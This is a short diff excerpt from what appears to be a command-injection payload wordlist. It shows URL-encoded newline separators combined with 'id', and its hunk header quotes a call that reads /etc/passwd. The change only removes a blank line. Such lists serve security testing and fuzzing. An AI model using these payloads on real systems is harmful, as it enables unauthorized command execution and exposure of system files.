@@ -122,7 +122,6 @@ system('cat /etc/passwd');
 && 
 %0a
 %0a%0d
-
 %0Aid
 %0a id %0a
 %0Aid%0A
